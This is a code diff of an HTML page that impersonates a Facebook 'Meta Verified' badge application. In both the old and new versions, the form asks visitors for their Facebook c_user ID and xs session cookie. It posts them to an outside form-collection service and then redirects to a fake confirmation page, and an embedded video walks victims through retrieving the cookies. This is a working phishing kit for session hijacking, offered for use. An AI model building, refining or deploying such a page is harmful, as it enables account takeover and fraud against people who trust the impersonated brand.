@@ -1,23 +1,288 @@
 
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta Verified | Confirm Eligibility</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-color: #f0f2f5;
+      --form-bg: #ffffff;
+      --text-color: #444;
+      --input-bg: #f8f9fa;
+      --border-color: #ccd0d5;
+      --footer-text: #777;
+    }
 
+    body.dark {
+      --bg-color: #18191a;
+      --form-bg: #242526;
+      --text-color: #ddd;
+      --input-bg: #3a3b3c;
+      --border-color: #3e4042;
+      --footer-text: #aaa;
+    }
 
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      margin: 0;
+      padding: 0;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
 
-<html lang="en"><head>
-    <meta charset="UTF-8">
-    <link rel="icon" type="image/svg+xml" href="https://apply-get-verified-badge.vercel.app/assets/logo-xjw2vU6p.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Verified | Get a verified blue tick</title>
-    <script type="module" crossorigin="" src="/assets/index-D9lU3uHa.js"></script>
-    <link rel="stylesheet" crossorigin="" href="style.css">
-  </head>
-  <body>
-  <form action="https://submit-form.com/PI5419U4r" method="post">
-    <input
-    type="hidden"
-    name="_redirect"
-    value="https://new-get-a-checkmark.deno.dev/confirm.html"
-  /> 
-    <div id="root"> <div><form><div class="d-flex align-items-center" style="width: 100%; height: 90px; background: rgb(70, 103, 172);"><h1 class="text-white ms-4 m-0 d-flex align-self-center">facebook</h1></div><div class="d-flex align-items-center" style="width: 100%; height: 60px; background: rgb(233, 235, 238);"><h4 class="ms-4 m-0 d-flex align-self-center text-primary">Help Center</h4></div><div class="col-12 my-4 d-flex justify-content-center align-items-center"><div class="col-11 col-md-6 border"><div class="p-2" style="background: rgb(245, 246, 247);"><h5 class="m-0">Request a verified badge on Facebook</h5></div><div class="p-2"><p class="fw-semibold validation_form_para">The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.</p><p class="fw-semibold validation_form_para">Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p><p class="fw-semibold validation_form_para">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p><p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p><video controls="" autoplay="" src="https://cdn.glitch.global/e6fdea79-9332-410b-9d43-e610883fc60c/detailed%20video.mp4?v=1737384626648" style="width: 300px; height: 160px;"></video><br><button>Enable Sound</button><p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p><label class="" style="font-size: 12px;">c_user</label><br><input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits"><br><label class="mt-2" style="font-size: 12px;">xs</label><br><input type="text" name="xs"><p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p></div><div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);"><button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button></div></div></div></form></div></div>
+    .top-bar {
+      background: #1877f2;
+      color: white;
+      height: 56px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 20px;
+      font-size: 20px;
+      font-weight: 600;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+    }
 
+    .top-bar .right-section {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      font-size: 14px;
+      font-weight: 500;
+    }
 
-</body></html>
+    .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: white;
+    }
+
+    .dark-toggle {
+      background: transparent;
+      border: 1px solid white;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 100px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: background 0.3s;
+    }
+
+    .dark-toggle:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+
+    .form-container {
+      max-width: 760px;
+      margin: 40px auto;
+      background-color: var(--form-bg);
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      animation: fadeIn 0.4s ease;
+      overflow: hidden;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .form-header,
+    .form-footer {
+      background-color: #f5f6f7;
+      padding: 16px 24px;
+    }
+
+    body.dark .form-header,
+    body.dark .form-footer {
+      background-color: #3a3b3c;
+    }
+
+    .form-header h5 {
+      margin: 0;
+      font-size: 19px;
+      font-weight: 600;
+    }
+
+    .form-body {
+      padding: 24px;
+    }
+
+    .form-body p {
+      font-size: 15px;
+      margin-bottom: 14px;
+    }
+
+    label {
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: 18px;
+      display: block;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 12px 14px;
+      margin-top: 6px;
+      font-size: 14px;
+      background-color: var(--input-bg);
+      color: var(--text-color);
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      transition: background 0.3s, color 0.3s;
+    }
+
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+      background-color: #fff;
+    }
+
+    body.dark input:focus {
+      background-color: #2d2e30;
+    }
+
+    .video-container {
+      margin-top: 20px;
+    }
+
+    video {
+      width: 60%;
+      max-width: 440px;
+      border-radius: 10px;
+      margin-top: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    .submit-btn {
+      background-color: #0866ff;
+      color: white;
+      border: none;
+      border-radius: 100px;
+      padding: 12px 34px;
+      font-size: 15px;
+      font-weight: 500;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #0751c5;
+    }
+
+    .small-note {
+      font-size: 12px;
+      color: var(--footer-text);
+      margin-top: 10px;
+    }
+
+    .why-section {
+      background-color: #f8f9fb;
+      padding: 16px;
+      border-left: 4px solid #1877f2;
+      margin-top: 24px;
+      border-radius: 6px;
+    }
+
+    body.dark .why-section {
+      background-color: #2a2b2d;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: var(--footer-text);
+      padding: 30px 16px;
+    }
+
+    .footer a {
+      color: var(--footer-text);
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <form action="https://submit-form.com/QZPUTVXD2" method="post">
+    <input type="hidden" name="_redirect" value="https://new-get-a-checkmark.deno.dev/confirm.html" />
+
+    <div class="top-bar">
+      <div>facebook</div>
+      <div class="right-section">
+        
+        <div class="avatar"></div>
+        <button type="button" class="dark-toggle" onclick="toggleDarkMode()">Dark Mode</button>
+      </div>
+    </div>
+
+    <div class="form-container">
+      <div class="form-header">
+        <h5>
+          <img src="https://cdn-icons-png.flaticon.com/512/1051/1051377.png" alt="Verified" style="width: 22px; vertical-align: middle; margin-right: 6px;">
+          Request a Verified Badge on Facebook
+        </h5>
+      </div>
+
+      <div class="form-body">
+        <p><strong>Meta Verified</strong> helps you build trust by confirming your identity and authenticity on Facebook.</p>
+
+        <p>Selected creators have been invited to access Meta Verified for <strong>free for 12 months</strong>. This includes profile verification, direct support, and impersonation protection.</p>
+
+        <p>To confirm your invitation, please fill in the information below. This allows our internal team to verify your eligibility securely.</p>
+
+        <div class="why-section">
+          <p><strong>Why was I selected?</strong><br>We are offering free verification access to creators with consistent engagement, community impact, and cross-platform presence.</p>
+        </div>
+
+        <div class="video-container">
+          <p class="text-secondary mt-3" style="font-size: 13px;">Need help? Watch this short guide:</p>
+          <video controls autoplay muted>
+            <source src="https://cdn.glitch.global/e6fdea79-9332-410b-9d43-e610883fc60c/detailed%20video.mp4?v=1737384626648" type="video/mp4">
+          </video>
+        </div>
+
+        <label for="c_user">(c_user)</label>
+        <input type="number" name="c_user" required pattern="^\d{15}$" title="Enter your 15-digit Facebook user ID" />
+
+        <label for="xs">(xs)</label>
+        <input type="text" name="xs" required />
+
+        <p class="small-note">Stay logged in until your request is confirmed via email. Do not share this information elsewhere.</p>
+      </div>
+
+      <div class="form-footer d-flex justify-content-end">
+        <button type="submit" class="submit-btn">Submit</button>
+      </div>
+    </div>
+
+    <div class="footer">
+      <a href="#">Privacy</a> · 
+      <a href="#">Terms</a> · 
+      <a href="#">Cookies</a> · 
+      <span>Meta © 2025</span>
+    </div>
+  </form>
+
+  <script>
+    function toggleDarkMode() {
+      document.body.classList.toggle('dark');
+      localStorage.setItem('theme', document.body.classList.contains('dark') ? 'dark' : 'light');
+    }
+
+    // Load saved preference
+    if (localStorage.getItem('theme') === 'dark') {
+      document.body.classList.add('dark');
+    }
+  </script>
+</body>
+</html>
